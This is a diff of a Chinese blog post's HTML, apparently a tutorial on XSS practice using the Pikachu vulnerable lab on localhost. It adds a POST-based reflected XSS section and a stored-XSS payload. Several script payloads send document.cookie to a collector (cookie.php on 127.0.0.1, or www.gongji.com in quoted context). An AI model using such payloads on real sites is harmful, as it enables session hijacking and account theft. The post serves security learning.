@@ -458,6 +458,16 @@
 <p>在浏览器中输入该网址，然后查看后台，可以看到，攻击成功了。</p>
 <p><strong>关于如何查看后台，可以参考文章末尾给出的参考博客。</strong></p>
 <p><img src="https://i.loli.net/2020/10/28/gSYFUerZBu2EsAC.png" alt="image-20201028193602640"></p>
+<h4 id="post型xss"><a href="#post型xss" class="headerlink" title="post型xss"></a>post型xss</h4><p>思路与get型差不多，但是由于我们不能直接把恶意代码嵌入到url中，所以我们需要自己来搭一个恶意网站站点，然后放一个post表单，将这个post表单发送给受害者，诱导受害者点击，然后post表单会自动向漏洞服务器提交一个Post请求，实现受害者帮我们提交Post的目的。</p>
+<p><img src="https://i.loli.net/2020/10/30/XNgiJQ5bw4YVhyl.png" alt="xss_post"></p>
+<p>这个POST表单页面位于 WW/pikachu-master/pkxss/xcookie 下名为 post.html 的文件</p>
+<p><img src="https://i.loli.net/2020/10/30/lAZ9YEfwyHNj7Rg.png" alt="image-20201030094524078"></p>
+<p>重定向</p>
+<p><img src="https://i.loli.net/2020/10/30/NEBkICurv8yRMjb.png" alt="image-20201030094546545"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;hack.io&#x2F;pikachu-master&#x2F;pkxss&#x2F;xcookie&#x2F;post.html</span><br></pre></td></tr></table></figure>
+
+
+
 <h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p><strong>存储型XSS的原理是：主要是将恶意代码上传或存储到服务器中，下次只要受害者浏览包含此恶意代码的页面就会执行恶意代码。</strong></p>
 <p>比如我现在做了一个博客网站，然后攻击者在上面发布了一篇文章，内容是如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&quot;www.gongji.com?param&#x3D;&quot;+document.cookie)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
@@ -470,6 +480,10 @@
 <li>用户浏览器接收到响应后解析执行，那么其中的恶意代码也会被执行。</li>
 <li>那么恶意代码执行后，就能获取到用户数据，比如上面的cookie等信息，那么把该cookie发送到攻击者网站中，那么攻击者拿到该<br>cookie然后会冒充该用户的行为，调用目标网站接口等违法操作。</li>
 </ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line"> &lt;script&gt;document.location+&#x3D;+&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;hack.io&#x2F;pikachu-master&#x2F;pkxss&#x2F;xcookie&#x2F;cookie.php?cookie&#x3D;&#39;+++document.cookie;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
 <h3 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h3><p><a href="https://www.cnblogs.com/logsharing/p/8448446.html" target="_blank" rel="noopener">GET和POST两种基本请求方法的区别</a></p>
 <p><a href="https://www.w3school.com.cn/tags/html_ref_httpmethods.asp" target="_blank" rel="noopener">HTTP 方法：GET 对比 POST</a></p>
 <p><a href="https://www.cnblogs.com/tugenhua0707/p/10909284.html" target="_blank" rel="noopener">web安全之XSS攻击原理及防范</a></p>
@@ -546,10 +560,10 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-10-28T23:57:14+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-10-30T21:13:55+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>最后更新于：Oct 28, 2020</p>
+    <p>最后更新于：Oct 30, 2020</p>
   </a>
 </div>
 
@@ -704,7 +718,7 @@ CUMTOJ例题最长上升子序列 — dp，贪心+二分参考博客：最长上
 
 
     <div class='content'>
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#环境搭建"><span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#phpstudy"><span class="toc-text">phpstudy</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pikachu-master"><span class="toc-text">pikachu-master</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#文件配置"><span class="toc-text">文件配置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#启动"><span class="toc-text">启动</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#服务器与攻击者"><span class="toc-text">服务器与攻击者</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS概述"><span class="toc-text">XSS概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反射型xss"><span class="toc-text">反射型xss</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#get型XSS"><span class="toc-text">get型XSS</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#存储型XSS"><span class="toc-text">存储型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考博客"><span class="toc-text">参考博客</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#环境搭建"><span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#phpstudy"><span class="toc-text">phpstudy</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pikachu-master"><span class="toc-text">pikachu-master</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#文件配置"><span class="toc-text">文件配置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#启动"><span class="toc-text">启动</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#服务器与攻击者"><span class="toc-text">服务器与攻击者</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS概述"><span class="toc-text">XSS概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反射型xss"><span class="toc-text">反射型xss</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#get型XSS"><span class="toc-text">get型XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#post型xss"><span class="toc-text">post型xss</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#存储型XSS"><span class="toc-text">存储型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考博客"><span class="toc-text">参考博客</span></a></li></ol>
     </div>
   </section>
 
